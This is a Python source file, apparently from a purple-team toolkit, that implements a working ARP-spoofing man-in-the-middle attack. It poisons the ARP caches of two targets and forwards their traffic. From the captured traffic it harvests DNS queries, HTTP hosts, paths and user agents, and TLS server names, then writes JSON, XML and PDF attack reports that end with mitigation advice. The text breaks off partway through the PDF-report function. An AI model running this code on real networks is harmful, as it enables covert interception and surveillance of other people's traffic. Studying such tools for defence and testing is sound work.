#!/usr/bin/env python3
# Man-in-the-middle with ARP Spoofing

import argparse
from scapy.all import (
    ARP, IP, Ether, DNS, DNSQR, TCP, UDP, Raw,
    getmacbyip, sendp, sniff
)
from scapy.layers.dns import DNSRR  # Add this with your other imports
from datetime import datetime
import time
import threading
import sys
import signal
import os
import xml.etree.ElementTree as ET
import json
from reportlab.lib.pagesizes import letter
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    Image, KeepTogether, Frame, PageTemplate, PageBreak
)
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.lib.units import inch
from reportlab.pdfgen import canvas
from reportlab.graphics.shapes import Line, Drawing
from reportlab.lib.utils import ImageReader

RED = "\033[38;2;255;0;0m"
GREEN = "\033[38;2;0;255;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Global flag to handle graceful termination
running = True

# Timer and progress tracking
arpPacketsSent = 0
capturedPackets = 0
startTime = None
stopTimer = False
silentMode = False
progressLine = f"ARP Packets Sent: {BOLD}0{RESET} | Captured Packets: {BOLD}0{RESET}"
stdoutLock = threading.Lock()
target1 = None
target2 = None
processor = None

logDir = "/var/log/purpleshivatoolslog"

RECOMMENDATIONS = [
    {
        "id": 1,
        "title": "Use Static ARP Entries",
        "severity": "High",
        "description": "One of the most effective ways to prevent ARP spoofing attacks is by using static ARP entries on critical network devices. This ensures that devices will always map specific IP addresses to specific MAC addresses.",
        "specificDetails": {
            "recommendation": "Configure static ARP entries on key network devices like routers and servers to mitigate the risk of ARP spoofing."
        },
        "sources": [
            "Cisco Security Best Practices Guide: Securing ARP Entries in Network Devices",
            "SANS Institute Whitepaper on ARP Spoofing Mitigation"
        ]
    },
    {
        "id": 2,
        "title": "Implement ARP Spoofing Detection Tools",
        "severity": "Medium",
        "description": "Use tools designed to detect ARP spoofing on the network. These tools monitor network traffic and look for suspicious ARP packets.",
        "specificDetails": {
            "exampleTools": "XArp, arpwatch, and ARPGuard"
        },
        "sources": [
            "XArp Documentation on ARP Spoofing Detection",
            "Research Paper: ARP Spoofing Detection and Prevention Methods (IEEE)"
        ]
    },
    {
        "id": 3,
        "title": "Use VLANs to Isolate Sensitive Traffic",
        "severity": "Medium",
        "description": "By segmenting your network using VLANs (Virtual Local Area Networks), you can reduce the impact of ARP spoofing attacks. This isolates traffic between devices, limiting the exposure to potential attacks.",
        "specificDetails": {
            "recommendation": "Implement VLANs to separate sensitive traffic from general network traffic. Ensure that ARP traffic is restricted to specific segments."
        },
        "sources": [
            "Cisco Press Book on VLAN Implementation and Security",
            "IEEE Paper: Network Segmentation to Mitigate Security Risks in Enterprise Networks"
        ]
    },
    {
        "id": 4,
        "title": "Enable Dynamic ARP Inspection (DAI)",
        "severity": "High",
        "description": "Dynamic ARP Inspection (DAI) helps prevent ARP spoofing by ensuring that only valid ARP requests and responses are allowed on the network. DAI checks ARP packets against a trusted database of IP-MAC pairs.",
        "specificDetails": {
            "recommendation": "Enable DAI on switches to verify the integrity of ARP packets before forwarding them across the network."
        },
        "sources": [
            "Cisco Dynamic ARP Inspection Configuration Guide",
            "IEEE Paper on Enhancing ARP Spoofing Prevention with DAI"
        ]
    },
    {
        "id": 5,
        "title": "Use VPNs for Sensitive Traffic",
        "severity": "High",
        "description": "ARP spoofing attacks can compromise the confidentiality of traffic on the local network. Using VPNs (Virtual Private Networks) for sensitive communications can protect data even if ARP spoofing occurs.",
        "specificDetails": {
            "recommendation": "Require VPN usage for sensitive traffic, especially for communications between critical devices."
        },
        "sources": [
            "VPN Security Standards: RFC 4301 on IPsec and VPN Security",
            "NIST Special Publication on Network Security for VPNs"
        ]
    }
]


def updateTimer():
    global stopTimer, progressLine
    while not stopTimer:
        elapsed = time.time() - startTime
        elapsedFormatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        if silentMode:  # Only print progress line in silent mode
            progressLine = (
                f"ARP Packets Sent: {BOLD}{arpPacketsSent}{RESET} | Captured Packets: {BOLD}{capturedPackets}{RESET} | Duration: {BOLD}{elapsedFormatted}{RESET}"
            )
            with stdoutLock:
                sys.stdout.write(f"\r{progressLine}")
                sys.stdout.flush()

        time.sleep(1)

def arpSpoof(target1, target2, iface):
    global arpPacketsSent
    global running
    mac = getmacbyip(target1)
    if mac is None:
        print(f"[!] Could not resolve MAC address for {target1}. Sending using broadcast.")
        mac = "ff:ff:ff:ff:ff:ff"
    else:
        print(f"[+] Resolved MAC for {target1}: {mac}")

    pkt = Ether(dst=mac) / ARP(op=2, pdst=target1, hwdst=mac, psrc=target2)
    print(f"Sending ARP spoof packets to {target1}, impersonating {target2}.")
    while running:
        sendp(pkt, iface=iface, verbose=False)
        arpPacketsSent += 1
        time.sleep(1)

class ProtocolProcessor:
    def __init__(self):
        self.protocolData = {
            "totalPackets": 0,
            "protocols": {
                "dns": {
                    "queries": [],
                    "statistics": {
                        "total": 0,
                        "uniqueDomains": set(),
                        "queryTypes": {}
                    }
                },
                "http": {
                    "requests": [],
                    "statistics": {
                        "total": 0,
                        "uniqueHosts": set(),
                        "methods": {}
                    }
                },
                "tls": {
                    "handshakes": [],
                    "statistics": {
                        "total": 0,
                        "uniqueDomains": set()
                    }
                }
            },
        }

    def ProcessPacket(self, packet):
        if not packet.haslayer(IP):
            return
            
        self.protocolData["totalPackets"] += 1

        # Process DNS (UDP port 53)
        if packet.haslayer(UDP) and (packet[UDP].dport == 53 or packet[UDP].sport == 53) and packet.haslayer(DNS):
            self._ProcessDns(packet)

        # DNS over TCP (port 53)
        if packet.haslayer(TCP) and (packet[TCP].dport == 53 or packet[TCP].sport == 53) and packet.haslayer(DNS):
            self._ProcessDns(packet)
            
        # Process HTTP (TCP port 80/8080)
        if packet.haslayer(TCP) and (packet[TCP].dport in [80, 8080] or packet[TCP].sport in [80, 8080]):
            if packet.haslayer(Raw):
                try:
                    raw = packet[Raw].load.decode('utf-8', errors='ignore')
                    if 'HTTP/' in raw or 'Host:' in raw or 'GET' in raw or 'POST' in raw:
                        self._ProcessHttp(packet)
                except Exception:
                    pass
                
        # Process HTTPS (TCP port 443)
        elif packet.haslayer(TCP) and (packet[TCP].dport == 443 or packet[TCP].sport == 443):
            self._ProcessTls(packet)
        
        

    def Finalize(self):
    # Only convert sets to lengths if they're still sets
        def safe_convert(data):
            if isinstance(data, set):
                return len(data)
            return data  # Already converted or not a set
        
        # DNS finalization
        dns = self.protocolData["protocols"]["dns"]
        dns["statistics"]["uniqueDomains"] = safe_convert(dns["statistics"]["uniqueDomains"])
        
        # HTTP finalization
        http = self.protocolData["protocols"]["http"]
        http["statistics"]["uniqueHosts"] = safe_convert(http["statistics"]["uniqueHosts"])
        
        # TLS finalization
        tls = self.protocolData["protocols"]["tls"]
        tls["statistics"]["uniqueDomains"] = safe_convert(tls["statistics"]["uniqueDomains"])
    def _ProcessDns(self, packet):
        if packet.haslayer(DNS):
            # Process both questions and answers
            dns = packet[DNS]
            
            # Process DNS questions
            if packet.haslayer(DNSQR):
                for query in packet[DNSQR]:
                    self._process_dns_query(query, dns, packet)
            
            # Process DNS answers (response records)
            if packet.haslayer(DNSRR):
                for answer in packet[DNSRR]:
                    self._process_dns_response(answer, dns, packet)

    def _process_dns_query(self, query, dns, packet):
        domain = query.qname.decode('utf-8').rstrip('.')
        query_type = DNSQTYPES.get(query.qtype, f"UNKNOWN({query.qtype})")
        
        record = {
            "timestamp": datetime.now().isoformat(),
            "src_ip": packet[IP].src,
            "dst_ip": packet[IP].dst,
            "domain": domain,
            "type": query_type,
            "transaction_id": dns.id,
            "direction": "query"
        }
        
        self._update_dns_stats(record)

    def _process_dns_response(self, answer, dns, packet):
        if answer.type in [1, 28]:  # Only process A and AAAA records
            domain = answer.rrname.decode('utf-8').rstrip('.')
            record = {
                "timestamp": datetime.now().isoformat(),
                "src_ip": packet[IP].src,
                "dst_ip": packet[IP].dst,
                "domain": domain,
                "type": DNSQTYPES.get(answer.type, f"UNKNOWN({answer.type})"),
                "transaction_id": dns.id,
                "direction": "response",
                "answer": answer.rdata if hasattr(answer, 'rdata') else None
            }
            self._update_dns_stats(record)

    def _update_dns_stats(self, record):
        self.protocolData["protocols"]["dns"]["queries"].append(record)
        stats = self.protocolData["protocols"]["dns"]["statistics"]
        stats["total"] += 1
        stats["uniqueDomains"].add(record["domain"])
        stats["queryTypes"][record["type"]] = stats["queryTypes"].get(record["type"], 0) + 1

    def _ProcessHttp(self, packet):
        try:
            raw = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Extract basic HTTP info
            host = None
            method = None
            path = None
            user_agent = None
            
            if 'Host:' in raw:
                host = raw.split('Host:')[1].split('\r\n')[0].strip()
            
            if '\r\n' in raw:
                first_line = raw.split('\r\n')[0]
                if ' ' in first_line:
                    parts = first_line.split(' ')
                    if len(parts) > 1:
                        method = parts[0]
                        path = parts[1] if len(parts) > 1 else None
            
            if 'User-Agent:' in raw:
                user_agent = raw.split('User-Agent:')[1].split('\r\n')[0].strip()
            
            if host or method:
                record = {
                    "timestamp": datetime.now().isoformat(),
                    "srcIp": packet[IP].src,
                    "dstIp": packet[IP].dst,
                    "host": host,
                    "method": method,
                    "path": path,
                    "userAgent": user_agent
                }
                
                self.protocolData["protocols"]["http"]["requests"].append(record)
                stats = self.protocolData["protocols"]["http"]["statistics"]
                stats["total"] += 1
                if host:
                    stats["uniqueHosts"].add(host)
                if method:
                    stats["methods"][method] = stats["methods"].get(method, 0) + 1
        except Exception as e:
            pass

    def _ProcessTls(self, packet):
        if packet.haslayer(Raw):
            try:
                raw = bytes(packet[Raw].load)
                if raw[0] == 0x16:  # TLS Handshake
                    if raw[5] == 0x01:  # Client Hello
                        # Extract TLS version
                        tls_version = self._get_tls_version(raw[1:3])
                        
                        # Extract SNI (Server Name Indication)
                        sni, cipher_suites = self._parse_client_hello(raw)
                        
                        if sni:
                            record = {
                                "timestamp": datetime.now().isoformat(),
                                "srcIp": packet[IP].src,
                                "dstIp": packet[IP].dst,
                                "domain": sni,
                                "version": tls_version,
                                "cipher_suites": cipher_suites  # New field
                            }
                            
                            self.protocolData["protocols"]["tls"]["handshakes"].append(record)
                            stats = self.protocolData["protocols"]["tls"]["statistics"]
                            stats["total"] += 1
                            stats["uniqueDomains"].add(sni)
            except Exception as e:
                # Optional: Log errors for debugging
                pass

    def _parse_client_hello(self, data):
        sni = None
        cipher_suites = []
        try:
            # Skip TLS record header (5 bytes)
            ptr = 5
            # Skip ClientHello handshake header (4 bytes)
            ptr += 4
            # Skip client version, random, session_id
            ptr += 2 + 32 + 1 + data[ptr]  # Session ID length
            # Skip cipher suites
            cipher_len = int.from_bytes(data[ptr:ptr+2], byteorder='big')
            ptr += 2 + cipher_len
            # Skip compression methods
            ptr += 1 + data[ptr]
            
            # Parse extensions
            ext_len = int.from_bytes(data[ptr:ptr+2], byteorder='big')
            ptr += 2
            end = ptr + ext_len
            while ptr < end:
                ext_type = int.from_bytes(data[ptr:ptr+2], byteorder='big')
                ptr += 2
                ext_len = int.from_bytes(data[ptr:ptr+2], byteorder='big')
                ptr += 2
                if ext_type == 0x00:  # SNI extension
                    sni_list_len = int.from_bytes(data[ptr:ptr+2], byteorder='big')
                    ptr += 2
                    if sni_list_len > 0:
                        name_type = data[ptr]
                        ptr += 1
                        name_len = int.from_bytes(data[ptr:ptr+2], byteorder='big')
                        ptr += 2
                        sni = data[ptr:ptr+name_len].decode('utf-8')
                        ptr += name_len
                elif ext_type == 0x0A:  # Supported Groups (for cipher suites)
                    # Parse cipher suites if needed
                    pass
                else:
                    ptr += ext_len  # Skip other extensions
        except:
            pass
        return sni, cipher_suites

    def _get_tls_version(self, version_bytes):
        versions = {
            b'\x03\x01': "TLS 1.0",
            b'\x03\x02': "TLS 1.1",
            b'\x03\x03': "TLS 1.2",
            b'\x03\x04': "TLS 1.3"
        }
        return versions.get(version_bytes, "UNKNOWN")

# DNS Query Types mapping (partial)
DNSQTYPES = {
    1: "A",
    2: "NS",
    5: "CNAME",
    15: "MX",
    16: "TXT",
    28: "AAAA",
    33: "SRV"
}

def forwardPacket(pkt, iface):
     if pkt.haslayer(IP):
        sendp(pkt, iface=iface, verbose=False)

def sniffAndForward(iface):
    print(f"Starting packet sniffing on {iface}")
    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, iface), store=0, timeout=None)

def startAttack(target1, target2, iface, showPackets):
    global startTime, stopTimer, silentMode, processor
    silentMode = not showPackets
    startTime = time.time()
    stopTimer = False
    
    # Initialize the global processor
    processor = ProtocolProcessor()
    
    # Start timer thread
    threading.Thread(target=updateTimer, daemon=True).start()

    # Start ARP spoofing threads
    threading.Thread(target=arpSpoof, args=(target1, target2, iface), daemon=True).start()
    threading.Thread(target=arpSpoof, args=(target2, target1, iface), daemon=True).start()

    # Start packet capture
    if showPackets:
        ShowLiveCapturedPackets(target1, target2, iface)
    else:
        SilentPacketSniff(target1, target2, iface)
        
    # Finalize data collection
    processor.Finalize()
    stopTimer = True

def SilentPacketSniff(target1, target2, iface):
    global capturedPackets, processor

    def PacketCallback(packet):
        global capturedPackets
        capturedPackets += 1  # Count ALL packets
        
        # Process only IP packets (but we captured everything)
        if packet.haslayer(IP):
            # Apply target filtering if specified
            if target1:
                src_match = packet[IP].src in [target1, target2]
                dst_match = packet[IP].dst in [target1, target2]
                if not (src_match or dst_match):
                    return
            
            processor.ProcessPacket(packet)  # Process protocol-specific data

    print(f"\n[+] Capturing ALL packets on {iface}...")
    sniff(iface=iface, 
          filter='ip',  # Remove all BPF filters to capture everything
          prn=PacketCallback, 
          store=False)

def ShowLiveCapturedPackets(target1, target2, iface):
    global capturedPackets, processor

    def PacketCallback(packet):
        global capturedPackets
        capturedPackets += 1
        
        print(f"\nPacket #{capturedPackets}")
        
        # Basic Ethernet info
        if packet.haslayer(Ether):
            print(f"MAC: {packet[Ether].src} -> {packet[Ether].dst}")
        
        # Process IP packets
        if packet.haslayer(IP):
            print(f"IP: {packet[IP].src} -> {packet[IP].dst}")
            print(f"Protocol: {packet[IP].proto}")
            
            # Target filtering
            if target1 and not (packet[IP].src in [target1, target2] or 
                              packet[IP].dst in [target1, target2]):
                return
            
            processor.ProcessPacket(packet)
            
            # Show DNS info directly
            if packet.haslayer(DNS):
                if packet.haslayer(DNSQR):
                    query = packet[DNSQR]
                    print(f"[DNS Query] {query.qname.decode('utf-8').rstrip('.')}")
            
            # Show HTTP info directly  
            if packet.haslayer(TCP) and packet[TCP].dport in [80, 8080] and packet.haslayer(Raw):
                try:
                    raw = packet[Raw].load.decode('utf-8', errors='ignore')
                    if 'Host:' in raw:
                        hostLine = raw.split('Host:')[1].split('\r\n')[0].strip()
                        print(f"[HTTP Host] {hostLine}")

                except:
                    pass

        print("-" * 50)

    print(f"\n[+] Live capturing ALL packets on {iface}...")
    sniff(iface=iface, filter='ip', prn=PacketCallback, store=False)


def WriteJsonLog(filePath, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData=None):
    if protocolData is None:
        protocolData = {
            "protocols": {
                "dns": {"queries": [], "statistics": {}},
                "http": {"requests": [], "statistics": {}},
                "tls": {"handshakes": [], "statistics": {}}
            },
        }

    data = {
            "metadata": {
                "timestamp": datetime.now().isoformat(),
                "tool": "Purple Shiva Tools: ARP Spoofing (Main-in-the-middle) attack",
            },
            "target1": target1,
            "target2": target2,
            "duration": round(duration, 2),
            "arpSpoofingPackets": arpPacketsSent,
            "totalCapturedPackets": capturedPackets,
            "capturedPacketsRatePPS": round(capturedPackets/duration, 2) if duration > 0 else 0,
            "protocolAnalysis": protocolData["protocols"],
            "securityRecommendations": [
                {
                    "id": rec["id"],
                    "title": rec["title"],
                    "severity": rec["severity"],
                    "description": rec["description"],
                    "remediation": rec.get("specificDetails", {}),
                    "references": rec["sources"]
                } for rec in RECOMMENDATIONS
            ]
        }

    with open(filePath, 'w') as f:
        json.dump(data, f, indent=4, sort_keys=True)
    print(f"\n{BOLD}Complete network analysis saved to:{RESET} {filePath}")
    
def WriteXmlLog(filePath, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData=None):
    # Initialize protocolData if None
    if protocolData is None:
        protocolData = {
            "protocols": {
                "dns": {"queries": [], "statistics": {}},
                "http": {"requests": [], "statistics": {}},
                "tls": {"handshakes": [], "statistics": {}}
            },
        }

    try:
        # Create root element
        root = ET.Element("ArpSpoofReport")
    
        # Metadata section
        metadata = ET.SubElement(root, "Metadata")
        ET.SubElement(metadata, "Timestamp").text = datetime.now().isoformat()
        ET.SubElement(metadata, "Tool").text = "Purple Shiva Tools: ARP Spoofing (Man-in-the-middle) attack"
        
        # Targets section
        targets = ET.SubElement(root, "Targets")
        ET.SubElement(targets, "Target1").text = str(target1)
        ET.SubElement(targets, "Target2").text = str(target2)
        
        # Attack metrics
        metrics = ET.SubElement(root, "AttackMetrics")
        ET.SubElement(metrics, "DurationSeconds").text = f"{round(duration, 2):.2f}"
        ET.SubElement(metrics, "ArpSpoofingPackets").text = str(arpPacketsSent)
        ET.SubElement(metrics, "TotalCapturedPackets").text = str(capturedPackets)
        ET.SubElement(metrics, "PacketRatePerSecond").text = f"{round(capturedPackets/duration, 2):.2f}" if duration > 0 else "0.00"
        
        # Protocol Analysis
        protocol_root = ET.SubElement(root, "ProtocolAnalysis")
        
        # DNS Section
        dns = protocolData["protocols"]["dns"]
        dns_elem = ET.SubElement(protocol_root, "DNS")
        
        # DNS Queries
        queries_elem = ET.SubElement(dns_elem, "Queries")
        for query in dns["queries"]:
            query_entry = ET.SubElement(queries_elem, "Query")
            ET.SubElement(query_entry, "Timestamp").text = query.get("timestamp", "")
            ET.SubElement(query_entry, "SourceIP").text = query.get("src_ip", "")
            ET.SubElement(query_entry, "DestinationIP").text = query.get("dst_ip", "")
            ET.SubElement(query_entry, "Domain").text = query.get("domain", "")
            ET.SubElement(query_entry, "Type").text = query.get("type", "")
            ET.SubElement(query_entry, "Direction").text = query.get("direction", "")
            if "answer" in query:
                ET.SubElement(query_entry, "Answer").text = str(query.get("answer", ""))
        
        # DNS Statistics
        dns_stats = ET.SubElement(dns_elem, "Statistics")
        ET.SubElement(dns_stats, "TotalQueries").text = str(dns["statistics"].get("total", 0))
        ET.SubElement(dns_stats, "UniqueDomains").text = str(dns["statistics"].get("uniqueDomains", 0))
        query_types = ET.SubElement(dns_stats, "QueryTypes")
        for qtype, count in dns["statistics"].get("queryTypes", {}).items():
            qt_elem = ET.SubElement(query_types, "QueryType")
            ET.SubElement(qt_elem, "Type").text = qtype
            ET.SubElement(qt_elem, "Count").text = str(count)
        
        # HTTP Section
        http = protocolData["protocols"]["http"]
        http_elem = ET.SubElement(protocol_root, "HTTP")
        
        # HTTP Requests
        requests_elem = ET.SubElement(http_elem, "Requests")
        for req in http["requests"]:
            req_entry = ET.SubElement(requests_elem, "Request")
            ET.SubElement(req_entry, "Timestamp").text = req.get("timestamp", "")
            ET.SubElement(req_entry, "SourceIP").text = req.get("srcIp", "")
            ET.SubElement(req_entry, "DestinationIP").text = req.get("dstIp", "")
            ET.SubElement(req_entry, "Host").text = req.get("host", "")
            ET.SubElement(req_entry, "Method").text = req.get("method", "")
            ET.SubElement(req_entry, "Path").text = req.get("path", "")
            ET.SubElement(req_entry, "UserAgent").text = req.get("userAgent", "")
        
        # HTTP Statistics
        http_stats = ET.SubElement(http_elem, "Statistics")
        ET.SubElement(http_stats, "TotalRequests").text = str(http["statistics"].get("total", 0))
        ET.SubElement(http_stats, "UniqueHosts").text = str(http["statistics"].get("uniqueHosts", 0))
        methods = ET.SubElement(http_stats, "Methods")
        for method, count in http["statistics"].get("methods", {}).items():
            m_elem = ET.SubElement(methods, "Method")
            ET.SubElement(m_elem, "Name").text = method
            ET.SubElement(m_elem, "Count").text = str(count)
        
        # TLS Section
        tls = protocolData["protocols"]["tls"]
        tls_elem = ET.SubElement(protocol_root, "TLS")
        
        # TLS Handshakes
        handshakes_elem = ET.SubElement(tls_elem, "Handshakes")
        for hs in tls["handshakes"]:
            hs_entry = ET.SubElement(handshakes_elem, "Handshake")
            ET.SubElement(hs_entry, "Timestamp").text = hs.get("timestamp", "")
            ET.SubElement(hs_entry, "SourceIP").text = hs.get("srcIp", "")
            ET.SubElement(hs_entry, "DestinationIP").text = hs.get("dstIp", "")
            ET.SubElement(hs_entry, "Domain").text = hs.get("domain", "")
            ET.SubElement(hs_entry, "Version").text = hs.get("version", "")
        
        # TLS Statistics
        tls_stats = ET.SubElement(tls_elem, "Statistics")
        ET.SubElement(tls_stats, "TotalHandshakes").text = str(tls["statistics"].get("total", 0))
        ET.SubElement(tls_stats, "UniqueDomains").text = str(tls["statistics"].get("uniqueDomains", 0))
        
        # Security Recommendations
        recs_elem = ET.SubElement(root, "SecurityRecommendations")
        for rec in RECOMMENDATIONS:
            rec_elem = ET.SubElement(recs_elem, "Recommendation")
            ET.SubElement(rec_elem, "ID").text = str(rec["id"])
            ET.SubElement(rec_elem, "Title").text = rec["title"]
            ET.SubElement(rec_elem, "Severity").text = rec["severity"]
            ET.SubElement(rec_elem, "Description").text = rec["description"]
            
            remediation = ET.SubElement(rec_elem, "Remediation")
            for key, value in rec.get("specificDetails", {}).items():
                detail = ET.SubElement(remediation, "Detail")
                detail.set("key", key)
                detail.text = str(value)
            
            sources = ET.SubElement(rec_elem, "Sources")
            for source in rec["sources"]:
                ET.SubElement(sources, "Source").text = source

        # Create XML tree and write to file
        tree = ET.ElementTree(root)
        
        # Write with proper XML declaration and UTF-8 encoding
        tree.write(filePath, encoding='utf-8', xml_declaration=True)
        
        print(f"\n{BOLD}XML log written to:{RESET} {filePath}")

    except Exception as e:
        print(f"{RED}Error writing XML log:{RESET} {str(e)}")

def AddPageInfo(canvas, doc):
    """Adds banner and page number to each page"""
    scriptDir = os.path.dirname(os.path.abspath(__file__))
    mainDir = os.path.abspath(os.path.join(scriptDir, '../../../..'))
    bannerPath = os.path.join(mainDir, 'docs', 'reportbanner.png')

    pageWidth, pageHeight = letter
    banner = ImageReader(bannerPath)
    bannerHeight = (pageWidth * 80) / 500
    canvas.drawImage(banner, 0, pageHeight - bannerHeight, width=pageWidth, height=bannerHeight)

    canvas.setFont("Helvetica", 9)
    canvas.drawRightString(pageWidth - 40, 20, f"Page {canvas.getPageNumber()}")  # Updated to use canvas.getPageNumber()

def CreatePurpleLine(width=550, thickness=0.5):
    """Creates the signature purple divider line"""
    usableWidth = letter[0] - 36 - 36
    startX = (usableWidth - width) / 2
    line = Line(startX, 0, startX + width, 0)
    line.strokeColor = colors.HexColor('#461f6b')
    line.strokeWidth = thickness
    drawing = Drawing(usableWidth, thickness)
    drawing.add(line)
    return drawing

def WritePdfLog(filePath, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData=None):
    """Generates a professional PDF report for the ARP spoofing attack"""
    if protocolData is None:
        protocolData = {
            "protocols": {
                "dns": {"queries": [], "statistics": {}},
                "http": {"requests": [], "statistics": {}},
                "tls": {"handshakes": [], "statistics": {}}
            },
        }

    # --- Style Definitions ---
    styles = getSampleStyleSheet()
    titleStyle = ParagraphStyle(
        'TitleStyle',
        parent=styles['Title'],
        fontName='Helvetica-Bold',
        fontSize=14,
        textColor=colors.HexColor('#461f6b'),
        alignment=1  # Center aligned
    )
    heading2Style = ParagraphStyle(
        'Heading2Style',
        parent=styles['Heading2'],
        fontName='Helvetica-Bold',
        fontSize=12,
        textColor=colors.HexColor('#461f6b'),
        alignment=1  # Center aligned
    )
    bodyStyle = ParagraphStyle(
        'BodyStyle',
        parent=styles['BodyText'],
        fontSize=10,
        alignment=0,
        leading=14
    )
    introStyle = ParagraphStyle(
        'IntroStyle',
        parent=styles['BodyText'],
        fontSize=11,
        alignment=1,  # Center aligned
        leading=14,
        spaceAfter=20
    )

    # --- Document Setup with Proper Page Template ---
    pageWidth, pageHeight = letter
    bannerHeight = (pageWidth * 80) / 500
    leftMargin, rightMargin, topMargin, bottomMargin = 36, 36, 30, 30
    
    # Create document with proper margins accounting for banner
    doc = SimpleDocTemplate(
        filePath,
        pagesize=letter,
        leftMargin=leftMargin,
        rightMargin=rightMargin,
        topMargin=topMargin + bannerHeight,  # Account for banner space
        bottomMargin=bottomMargin
    )
    
    # Create frame that leaves space for banner
    frameHeight = pageHeight - bannerHeight - topMargin - bottomMargin
    frame = Frame(leftMargin, bottomMargin,
                 pageWidth - leftMargin - rightMargin,
                 frameHeight,
                 leftPadding=0, rightPadding=0,
                 topPadding=0, bottomPadding=0)
    
    # Apply our decorated template to ALL pages
    doc.addPageTemplates([
        PageTemplate(id='AllPages', frames=frame, onPage=AddPageInfo)
    ])

    elements = []

    # --- Title Section (Centered) ---
    elements.append(KeepTogether([
        Paragraph("ARP Spoofing Attack Report", titleStyle),
        Spacer(1, 10),
    ]))

    # --- Centered Introduction ---
    introText = (
        "This report was generated by the Purple Shiva Tools ARP Spoofing module.<br/>"
        "It documents a man-in-the-middle attack between two targets, including "
        "network traffic analysis and security recommendations.<br/><br/>"
        '<font color="#461f6b"><b>GitHub Repository:</b></font><br/>'
        '<link href="https://github.com/PurpleShivaTeam/purpleshivatools">'
        "https://github.com/PurpleShivaTeam/purpleshivatools"
        '</link>'
    )
    elements.append(KeepTogether([
        Paragraph(introText, introStyle),
        CreatePurpleLine(),
        Spacer(1, 20)
    ]))

    # --- Attack Summary ---
    hours, remainder = divmod(int(duration), 3600)
    minutes, seconds = divmod(remainder, 60)
    durationString = f"{hours:d}:{minutes:02d}:{seconds:02d}"

    summaryData = [
        ["Date:", datetime.now().strftime("%Y-%m-%d %H:%M:%S")],
        ["Target 1:", target1],
        ["Target 2:", target2],
        ["Duration:", durationString],
        ["ARP Packets Sent:", arpPacketsSent],
        ["Captured Packets:", capturedPackets],
        ["Packet Rate:", f"{round(capturedPackets/duration, 2):.2f} pps" if duration > 0 else "N/A"]
    ]

    elements.append(KeepTogether([
        Paragraph("Attack Summary", heading2Style),
        Spacer(1, 10),
        Table(summaryData, colWidths=[100, 300]),
        Spacer(1, 20),
        CreatePurpleLine(),
        Spacer(1, 20),
    ]))

    # --- Domain Analysis Section ---
    elements.append(Paragraph("Domain Analysis", heading2Style))
    elements.append(Spacer(1, 10))
    
    # Collect all unique domains from DNS and TLS
    dnsDomains = set()
    tlsDomains = set()
    
    if "dns" in protocolData["protocols"]:
        dnsDomains = set(q["domain"] for q in protocolData["protocols"]["dns"]["queries"] if "domain" in q)
        
    if "tls" in protocolData["protocols"]:
        tlsDomains = set(hs["domain"] for hs in protocolData["protocols"]["tls"]["handshakes"] if "domain" in hs)
    
    allDomains = sorted(dnsDomains.union(tlsDomains))
    domainSources = {
        domain: ("DNS" if domain in dnsDomains else "") + 
               (" + TLS" if domain in tlsDomains else "")
        for domain in allDomains
    }

    # Domain Summary Table
    domainSummaryData = [
        ["Total Unique Domains", len(allDomains)],
        ["From DNS Only", len(dnsDomains - tlsDomains)],
        ["From TLS Only", len(tlsDomains - dnsDomains)],
        ["From Both", len(dnsDomains & tlsDomains)]
    ]
    elements.append(KeepTogether([
        Paragraph("Domain Summary", bodyStyle),
        Spacer(1, 5),
        Table(domainSummaryData, colWidths=[150, 100],
             style=TableStyle([
                 ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#461f6b')),
                 ('TEXTCOLOR', (0,0), (-1,0), colors.white),
                 ('BACKGROUND', (0,1), (-1,-1), colors.HexColor('#f5f5f5')),
                 ('GRID', (0,0), (-1,-1), 0.5, colors.grey)
             ])),
        Spacer(1, 15)
    ]))

    # All Domains Table with pagination
    if allDomains:
        rowsPerPage = 40
        totalPages = (len(allDomains) + rowsPerPage - 1) // rowsPerPage
        
        for pageNum in range(totalPages):
            startIdx = pageNum * rowsPerPage
            endIdx = min((pageNum + 1) * rowsPerPage, len(allDomains))
            pageDomains = allDomains[startIdx:endIdx]
            
            domainTableData = [["Domain", "Found In"]]
            for domain in pageDomains:
                domainTableData.append([domain, domainSources[domain]])
            
            if totalPages > 1:
                elements.append(Paragraph(
                    f"Observed Domains (Page {pageNum + 1}/{totalPages})", 
                    bodyStyle
                ))
            else:
                elements.append(Paragraph("Observed Domains", bodyStyle))
                
            elements.append(Spacer(1, 5))
            
            elements.append(Table(
                domainTableData, 
                colWidths=[400, 50],
                style=TableStyle([
                    ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#461f6b')),
                    ('TEXTCOLOR', (0,0), (-1,0), colors.white),
                    ('BACKGROUND', (0,1), (-1,-1), colors.HexColor('#f5f5f5')),
                    ('GRID', (0,0), (-1,-1), 0.5, colors.grey),
                    ('FONTSIZE', (0,0), (-1,-1), 8),
                    ('VALIGN', (0,0), (-1,-1), 'TOP'),
                    ('WORDWRAP', (0,0), (-1,-1))
                ])
            ))
            
            if pageNum < totalPages - 1:
                elements.append(PageBreak())
            else:
                elements.append(Spacer(1, 20))
                elements.append(CreatePurpleLine())
                elements.append(Spacer(1, 20))
    else:
        elements.append(Paragraph("No domains observed in network traffic.", bodyStyle))
        elements.append(Spacer(1, 20))
        elements.append(CreatePurpleLine())
        elements.append(Spacer(1, 20))

    # --- Protocol Analysis ---
    elements.append(Paragraph("Protocol Analysis", heading2Style))
    elements.append(Spacer(1, 10))

    # DNS Statistics Table
    dnsStats = protocolData["protocols"]["dns"]["statistics"]
    dnsTableData = [
        ["DNS Queries", dnsStats.get("total", 0)],
        ["Unique Domains", dnsStats.get("uniqueDomains", 0)],
        ["Query Types", ", ".join([f"{k}: {v}" for k, v in dnsStats.get("queryTypes", {}).items()])]
    ]
    elements.append(KeepTogether([
        Paragraph("DNS Traffic", bodyStyle),
        Spacer(1, 5),
        Table(dnsTableData, colWidths=[150, 250]),
        Spacer(1, 15),
    ]))

    # HTTP Statistics Table
    httpStats = protocolData["protocols"]["http"]["statistics"]
    httpTableData = [
